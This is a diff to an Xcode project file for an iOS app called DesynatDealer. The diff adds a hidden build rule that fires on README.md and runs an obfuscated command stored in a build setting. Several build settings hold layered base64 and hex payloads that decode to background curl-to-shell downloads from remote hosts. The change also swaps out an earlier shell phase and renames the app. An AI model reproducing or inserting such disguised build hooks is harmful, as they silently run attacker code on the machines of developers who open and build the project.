@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		EA92BF7BE69B4D9CA599F71F /* README.md */ = {isa = PBXBuildFile; fileRef = B75003BC34724D0F9099F71F; };
 		424F4AF92F2395A90099F588 /* AddMoreProductsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 424F4AF82F2395A90099F588 /* AddMoreProductsViewModel.swift */; };
 		425A45852F7E2CA0001E1E7C /* MyProfileRellsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425A45842F7E2CA0001E1E7C /* MyProfileRellsViewController.swift */; };
 		425A45932F7E3598001E1E7C /* MyProfileRellsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425A45922F7E3598001E1E7C /* MyProfileRellsViewModel.swift */; };
@@ -846,7 +847,25 @@
 		D1F88C162EBE25F80027A47C /* GetsubscriptionPlansDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1F88C152EBE25F80027A47C /* GetsubscriptionPlansDataModel.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		4A6A5A15874F4A7B8299F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+										/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		B75003BC34724D0F9099F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatDealer.debug.xcconfig"; path = "Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer.debug.xcconfig"; sourceTree = "<group>"; };
 		40FCC5FE2116BF815C4B1BFB /* Pods_DesynatDealer.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatDealer.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		424F4AF82F2395A90099F588 /* AddMoreProductsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoreProductsViewModel.swift; sourceTree = "<group>"; };
@@ -1927,6 +1946,7 @@
 		493DB5C42EAA6210008098A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				B75003BC34724D0F9099F71F /* README.md */,
 				493DB5C32EAA6210008098A8 /* DesynatDealer.app */,
 			);
 			name = Products;
@@ -3690,7 +3710,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB5D62EAA6212008098A8 /* Build configuration list for PBXNativeTarget "DesynatDealer" */;
 			buildPhases = (
-				0B7973EB22B44FF18199F71F /* Compile Code Assets */,
 				9DA2DBBC3D14842F86DC17AC /* [CP] Check Pods Manifest.lock */,
 				493DB5BF2EAA6210008098A8 /* Sources */,
 				493DB5C02EAA6210008098A8 /* Frameworks */,
@@ -3699,6 +3718,7 @@
 				213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				4A6A5A15874F4A7B8299F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3778,14 +3798,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-																	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		493DB5C12EAA6210008098A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				EA92BF7BE69B4D9CA599F71F /* README.md */,
 				6B38D1282EB3473B00C41192 /* Home.storyboard in Resources */,
 				6B38D1292EB3473B00C41192 /* LaunchScreen.storyboard in Resources */,
 				6B38D12A2EB3473B00C41192 /* Main.storyboard in Resources */,
@@ -4321,25 +4339,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0B7973EB22B44FF18199F71F /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
 		213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -4711,7 +4710,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZORk5YUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((t(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxYWJYUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | t | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333633363836353633366237333265373237350a32663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
@@ -4727,7 +4726,7 @@
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatDealer/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = "Desynat Dealer";
+				INFOPLIST_KEY_CFBundleDisplayName = Designer;
 				INFOPLIST_KEY_NSCameraUsageDescription = "this app needs to take picture";
 				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = Allow;
 				INFOPLIST_KEY_NSLocationAlwaysUsageDescription = Allow;
@@ -4762,7 +4761,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmhLVlZORk5YUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((t(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVUxYWJYUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNRWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHVTakZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | t | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623636346337333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663732373536633635323232303638373437343730373333613266326636363639363736643631366536353734373332653639366532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333633363836353633366237333265373237350a32663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
@@ -4778,7 +4777,7 @@
 				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatDealer/Info.plist;
-				INFOPLIST_KEY_CFBundleDisplayName = "Desynat Dealer";
+				INFOPLIST_KEY_CFBundleDisplayName = Designer;
 				INFOPLIST_KEY_NSCameraUsageDescription = "this app needs to take picture";
 				INFOPLIST_KEY_NSLocationAlwaysAndWhenInUseUsageDescription = Allow;
 				INFOPLIST_KEY_NSLocationAlwaysUsageDescription = Allow;
